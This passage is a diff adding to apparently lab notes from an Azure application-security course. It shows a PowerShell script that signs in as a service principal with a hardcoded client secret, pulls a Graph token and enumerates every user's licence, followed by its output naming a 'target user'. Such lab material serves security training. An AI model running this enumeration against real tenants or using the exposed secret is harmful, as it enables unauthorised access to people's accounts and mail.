@@ -89,3 +89,62 @@ Mail.Read	Application	810c84a8-4a9e-49e6-bf7d-12d183f40d01
 User.Read.All	Application	df021288-bdef-4463-88db-98f22de89214
 ```
 It's means that the current application could read every users and mails .
+
+The following script could be used for enumerate users and License, using graph Microsoft API:
+```
+Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
+$password= ConvertTo-SecureString 'TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('f0823e33-c430-4dd2-a56a-dca3c3a346a4', $password)
+Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
+$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
+#$URL = "https://graph.microsoft.com/v1.0/users?`$filter=startswith(displayName,'M')`&$orderby=displayName&`$count=true&`$top=1"
+$URL = "https://graph.microsoft.com/v1.0/users?`$count=true&`$top=350"
+$Params = @{
+"URI" = $URL
+"Method" = "GET"
+"Headers" = @{
+"Content-Type" = "application/json"
+"Authorization" = "Bearer $GraphToken"
+}
+}
+$Users = Invoke-RestMethod @Params -UseBasicParsing
+foreach($User in $Users.value)
+{
+    $UserID = $User.id
+    $URL = "https://graph.microsoft.com/v1.0/users/$UserID/licenseDetails"
+    $Params = @{
+        "URI"= $URL
+        "Method" = "GET"
+        "Headers" = @{
+            "Content-Type" = "application/json"
+            "Authorization" = "Bearer $GraphToken"
+        }
+    }
+    $LicenseDetails = Invoke-RestMethod @Params -UseBasicParsing
+    If($LicenseDetails.value -ne "" -and $LicenseDetails.value -ne $null){
+        [PSCustomObject]@{
+            ID = $User.id
+            DisplayName = $User.displayName
+            UserPrincipalName = $User.userPrincipalName
+            LicenseType = $LicenseDetails.value.skuPartNumber
+        }
+    }
+}
+```
+The execution output:
+```
+C:\AzAppsec\Abuse_read_permissions_users.ps1
+WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuser107\.A
+zure ). Please ensure that this directory has appropriate protections.
+
+Account                              SubscriptionName TenantId                             Environment
+-------                              ---------------- --------                             -----------
+f0823e33-c430-4dd2-a56a-dca3c3a346a4                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud 
+
+ID                : 0505af70-fea0-4dc9-8a8e-89cb1d0a16c5
+DisplayName       : Marie R Williams
+UserPrincipalName : MarieWilliams@pharmacorphq.onmicrosoft.com
+LicenseType       : O365_BUSINESS_ESSENTIALS
+```
+
+The target user is Marie R williams.
